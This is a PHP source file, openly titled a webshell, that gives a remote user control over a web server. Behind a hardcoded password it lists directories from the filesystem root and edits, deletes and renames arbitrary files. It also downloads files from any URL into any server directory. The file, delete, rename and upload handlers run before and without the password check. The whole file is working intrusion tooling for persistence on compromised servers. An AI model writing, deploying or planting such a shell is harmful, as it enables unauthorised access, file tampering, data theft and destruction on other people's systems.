<?php
session_start();

$password = 'ayane111'; 
$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
        $isAuthenticated = true;
    } else {
        echo "<div class='alert alert-danger'>Incorrect password.</div>";
    }
}

function uploadFromUrl($url, $saveTo) {
    $fileContent = file_get_contents($url);
    if ($fileContent === FALSE) {
        die('Failed to download file from URL');
    }
    file_put_contents($saveTo, $fileContent);
    echo "<div class='alert alert-success'>File uploaded successfully: $saveTo</div>";
}

function display_path_links($dir) {
    if (is_dir($dir)) {
        $folders = [];
        $files = [];

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            if (is_dir($dir . '/' . $item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        foreach ($folders as $folder) {
            $folderPath = htmlspecialchars($dir . '/' . $folder);
            echo "<a href='?dir=" . urlencode($folderPath) . "' class='list-group-item list-group-item-action'>$folder/</a>";
        }

        foreach ($files as $file) {
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            echo "<span>$file</span>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='edit' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<button type='submit' class='btn btn-primary btn-sm ml-2'>Edit</button>";
            echo "</form>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='delete' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<button type='submit' class='btn btn-danger btn-sm ml-2'>Delete</button>";
            echo "</form>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='rename' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' onclick=\"document.getElementById('rename-form').style.display='block'\">Rename</button>";
            echo "</form>";
            echo "</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Directory not found.</div>";
    }
}

function editFile($filePath, $newContent) {
    if (file_put_contents($filePath, $newContent) !== false) {
        echo "<div class='alert alert-success'>File edited successfully.</div>";
    } else {
        echo "<div class='alert alert-danger'>Failed to edit file.</div>";
    }
}

function deleteFile($filePath) {
    if (unlink($filePath)) {
        echo "<div class='alert alert-success'>File deleted successfully.</div>";
    } else {
        echo "<div class='alert alert-danger'>Failed to delete file.</div>";
    }
}

function renameFile($oldPath, $newPath) {
    if (rename($oldPath, $newPath)) {
        echo "<div class='alert alert-success'>File renamed successfully.</div>";
    } else {
        echo "<div class='alert alert-danger'>Failed to rename file.</div>";
    }
}

if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = $_POST['dir'];
    $filename = basename($url);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

if (isset($_POST['edit']) && isset($_POST['content'])) {
    $file = $_POST['edit'];
    $content = $_POST['content'];
    editFile($file, $content);
}

if (isset($_POST['delete'])) {
    $file = $_POST['delete'];
    deleteFile($file);
}

if (isset($_POST['rename']) && isset($_POST['newName'])) {
    $oldPath = $_POST['rename'];
    $newName = $_POST['newName'];
    $newPath = dirname($oldPath) . '/' . $newName;
    renameFile($oldPath, $newPath);
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$displayDir = realpath($dir);

if ($displayDir === false) {
    die('Invalid directory.');
}

$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell by Ayane Chan Arc</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <?php if (!$isAuthenticated): ?>
            <form method="post">
                <div class="form-group">
                    <label for="password">Enter Password</label>
                    <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-primary">Submit</button>
            </form>
        <?php else: ?>
            <h1 class="mb-4">Webshell by Ayane Chan Arc</h1>
            <div class="mb-4">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="?dir=/"><?php echo htmlspecialchars('/'); ?></a></li>
                        <?php foreach ($dirArray as $key => $dirPart): ?>
                            <?php $path = '/' . implode(DIRECTORY_SEPARATOR, array_slice($dirArray, 0, $key + 1)); ?>
                            <li class="breadcrumb-item">
                                <a href="?dir=<?php echo urlencode($path); ?>"><?php echo htmlspecialchars($dirPart); ?></a>
                            </li>
                        <?php endforeach; ?>
                    </ol>
                </nav>
            </div>
            <?php display_path_links($displayDir); ?>
            <form method="post" class="mt-4">
                <div class="form-group">
                    <label for="url">File URL</label>
                    <input type="text" id="url" name="url" class="form-control" placeholder="URL" required>
                </div>
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($displayDir); ?>">
                <button type="submit" class="btn btn-primary">Upload from URL</button>
            </form>
            <div id="rename-form" style="display:none;">
                <form method="post" class="mt-4">
                    <div class="form-group">
                        <label for="newName">New Name</label>
                        <input type="text" id="newName" name="newName" class="form-control" placeholder="New name" required>
                    </div>
                    <input type="hidden" name="rename" value="<?php echo htmlspecialchars($displayDir); ?>">
                    <button type="submit" class="btn btn-secondary">Rename</button>
                </form>
            </div>
        <?php endif; ?>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
